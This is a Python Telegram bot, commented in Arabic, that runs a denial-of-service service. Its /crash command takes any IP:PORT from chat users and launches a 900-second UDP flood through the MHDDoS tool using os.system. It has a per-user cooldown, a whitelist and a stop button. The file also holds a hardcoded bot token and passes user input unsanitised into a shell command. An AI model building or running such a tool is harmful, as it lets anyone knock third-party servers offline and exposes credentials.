import telebot
import os
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# هنا حط التوكن تا البوت تاك
TOKEN = "7684261013:AAGDDOGFZ8Uz2Vlp8CCF_UWr9uLyi5X1ejc"
bot = telebot.TeleBot(TOKEN)

# قائمة المستخدمين المسموح لهم بدون حد زمني
ALLOWED_USERS = [1480248962, 8068341198]  # ضع هنا معرّفات المستخدمين (Telegram User IDs)

# قواميس لتتبع آخر وقت تنفيذ الأمر لكل مستخدم
user_last_used = {}

# لتتبع الهجمات النشطة
active_attacks = {}

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        user_id = message.from_user.id
        current_time = time.time()

        # تحقق إذا كان المستخدم في القائمة المسموحة
        if user_id not in ALLOWED_USERS:
            # إذا المستخدم ليس في القائمة، تحقق من الوقت المنقضي
            if user_id in user_last_used:
                last_used = user_last_used[user_id]
                time_passed = current_time - last_used
                if time_passed < 2 * 60 * 60:  # ساعتين بالثواني
                    remaining_time = int((2 * 60 * 60 - time_passed) / 60)
                    bot.reply_to(
                        message, 
                        f"لا يمكنك استخدام هذا الأمر الآن. حاول مجددًا بعد {remaining_time} دقيقة."
                    )
                    return

        # تحديث وقت آخر استخدام
        user_last_used[user_id] = current_time

        # نجيبو النص اللي بعد /crash
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "رجاءً أكتب الأمر بالشكل الصحيح: /crash <IP>:<PORT>")
            return

        ip_port = command_parts[1]
        # التحقق من الشكل الصحيح للـ IP:PORT
        if ':' not in ip_port:
            bot.reply_to(message, "الشكل غير صحيح! لازم تكتب IP:PORT بالشكل الصحيح.")
            return

        # تفريق الـ IP والـ PORT
        ip, port = ip_port.split(':')
        if not ip or not port.isdigit():
            bot.reply_to(message, "الشكل غير صحيح! تأكد من الـ IP والـ PORT.")
            return

        # الرد على المستخدم
        response = f"Spamming this IP ===> {ip}:{port} for 900 seconds"
        bot.reply_to(message, response)

        # بدء الهجوم
        attack_id = f"{user_id}_{ip}_{port}"  # تعريف للهجوم بناءً على المستخدم والـ IP
        active_attacks[attack_id] = True  # تسجيل الهجوم كنشط
        command = f'python3 /workspaces/MHDDoS/start.py UDP {ip}:{port} 100 900'
        os.system(command)

        # إرسال زر لإيقاف الهجوم
        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("🛑 إيقاف الهجوم", callback_data=f"stop_{attack_id}")
        markup.add(stop_button)
        bot.send_message(message.chat.id, "يمكنك إيقاف الهجوم بالضغط على الزر أدناه:", reply_markup=markup)
    except Exception as e:
        bot.reply_to(message, f"صارت مشكلة: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_command(call):
    try:
        # استخراج معرف الهجوم
        attack_id = call.data.split("stop_")[1]

        # التحقق إذا كان الهجوم موجودًا ونشطًا
        if attack_id in active_attacks and active_attacks[attack_id]:
            # تنفيذ أمر إيقاف الهجوم
            os.system("python3 /workspaces/MHDDoS/start.py stop")
            active_attacks[attack_id] = False  # تحديث حالة الهجوم

            # إعلام المستخدم بإيقاف الهجوم
            bot.answer_callback_query(call.id, "تم إيقاف الهجوم بنجاح.")
            bot.send_message(call.message.chat.id, "✅ الهجوم توقف.")
        else:
            bot.answer_callback_query(call.id, "الهجوم غير نشط أو توقف بالفعل.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"صارت مشكلة أثناء إيقاف الهجوم: {str(e)}")

# تشغيل البوت
print("بوت تليجرام راهو يخدم...")
bot.polling()
